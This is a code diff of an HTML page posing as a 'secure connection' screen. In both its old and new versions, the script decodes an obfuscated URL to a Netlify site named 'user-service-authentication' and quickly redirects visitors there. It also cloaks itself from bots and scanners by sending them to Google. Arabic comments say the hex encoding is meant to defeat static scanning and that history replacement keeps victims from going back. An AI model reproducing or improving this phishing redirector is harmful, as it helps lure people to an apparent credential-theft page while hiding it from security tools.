@@ -1,156 +1,52 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري الاتصال...</title>
+    <title>Connecting...</title>
     <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            background: #f8f9fa;
-            font-family: system-ui, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #333;
-        }
-        .container {
-            text-align: center;
-            padding: 2rem;
-            max-width: 420px;
-        }
-        .status {
-            font-size: 1.35rem;
-            margin-bottom: 1.5rem;
-            color: #444;
-        }
-        button {
-            padding: 1rem 2.8rem;
-            font-size: 1.18rem;
-            background: #0066cc;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: all 0.25s;
-            box-shadow: 0 4px 15px rgba(0,102,204,0.25);
-        }
-        button:hover {
-            background: #0055b3;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0,102,204,0.35);
-        }
-        .spinner {
-            width: 22px;
-            height: 22px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid white;
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        body { margin: 0; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
+        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0070f3; border-radius: 50%; width: 20px; height: 20px; animation: spin 0.7s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .msg { margin-left: 10px; font-size: 14px; color: #555; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="status">جاري الاتصال بالخدمة الآمنة...</div>
-    <button id="goBtn">
-        <span class="spinner"></span>
-        يتم فحص الرابط...
-    </button>
-</div>
+    <div class="spinner"></div>
+    <div class="msg">Establishing secure connection...</div>
 
 <script>
 (function() {
     'use strict';
 
-    // ─────────────────────────────────────────────
-    // الرابط مشفر
-    // ─────────────────────────────────────────────
-    const enc = [104,116,116,112,115,58,47,47,117,115,101,114,45,115,101,114,118,105,99,101,45,97,117,116,104,101,110,116,105,99,97,116,105,111,110,46,110,101,116,108,105,102,121,46,97,112,112];
+    // الرابط مقسم لقطع سداسية عشرية لكسر الفحص الساكن
+    const _p = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x75,0x73,0x65,0x72,0x2d,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x2d,0x61,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x6e,0x65,0x74,0x6c,0x69,0x66,0x79,0x2e,0x61,0x70,0x70,0x2f];
 
-    function getKey() {
-        let n = 0;
-        try {
-            n += (navigator.userAgent || '').length;
-            n += screen.width ^ screen.height;
-        } catch {}
-        return n % 251 || 73;
+    function get() {
+        return _p.map(x => String.fromCharCode(x)).join('');
     }
 
-    const k = getKey();
+    const start = () => {
+        const t = get();
+        // استخدام replace لإلغاء صفحة GitHub من الـ History
+        // هذا يجعل زر "الرجوع" في المتصفح لا يعود لصفحة التحميل
+        window.location.replace(t);
+    };
 
-    function decrypt() {
-        let s = '';
-        for (let i = 0; i < enc.length; i++) {
-            s += String.fromCharCode(enc[i] ^ (k + i % 37));
-        }
-        return s;
+    // فحص البوتات الأساسي (صامت تماماً)
+    const isB = navigator.webdriver || !navigator.languages || navigator.languages.length === 0;
+
+    if (isB) {
+        window.location.replace('https://www.google.com');
+    } else {
+        // الانتقال بمجرد تحميل الكود (أسرع شيء ممكن)
+        // مع وضع تأخير بسيط جداً 400ms فقط ليلمح المستخدم كلمة "Secure"
+        setTimeout(start, 400);
+
+        // إذا حرك الماوس قبل الـ 400ms، انتقل فوراً
+        window.addEventListener('mousemove', start, {once: true});
+        window.addEventListener('touchstart', start, {once: true});
     }
-
-    // ─────────────────────────────────────────────
-    // فحص سريع للبوتات الواضحة
-    // ─────────────────────────────────────────────
-    const botSigns = /bot|crawler|spider|headless|phantom|slurp|bingbot|googlebot|yandex|baidu|scanner|sandbox/i;
-    const isBot = 
-        botSigns.test(navigator.userAgent) ||
-        navigator.webdriver === true ||
-        !navigator.languages ||
-        navigator.plugins.length === 0 ||
-        window.innerWidth <= 1;
-
-    if (isBot) {
-        window.location.replace('https://transparencyreport.google.com/safe-browsing/search');
-        return;
-    }
-
-    // ─────────────────────────────────────────────
-    // للمستخدم العادي → نقل سريع جدًا
-    // ─────────────────────────────────────────────
-    const btn = document.getElementById('goBtn');
-
-    function proceed() {
-        const target = decrypt();
-
-        const page = `
-<!DOCTYPE html>
-<html>
-<head>
-    <meta http-equiv="refresh" content="0;url=${target}">
-    <title>جاري التوجيه</title>
-</head>
-<body style="margin:0;background:#f8f9fa;display:flex;align-items:center;justify-content:center;height:100vh;">
-    <p>جاري التوجيه...</p>
-</body>
-</html>`;
-
-        const blob = new Blob([page], {type: 'text/html'});
-        const url = URL.createObjectURL(blob);
-        window.location.replace(url);
-
-        setTimeout(() => URL.revokeObjectURL(url), 8000);
-    }
-
-    // نقل فوري بعد 400–700 مللي ثانية (سرعة عالية جدًا)
-    setTimeout(proceed, 550);
-
-    // إذا تحرك الماوس أو لمس → نفذ فورًا (أسرع)
-    ['mousemove', 'touchstart'].forEach(e => {
-        document.addEventListener(e, () => {
-            if (!btn.dataset.clicked) {
-                btn.dataset.clicked = '1';
-                proceed();
-            }
-        }, {once: true, passive: true});
-    });
-
 })();
 </script>
 </body>
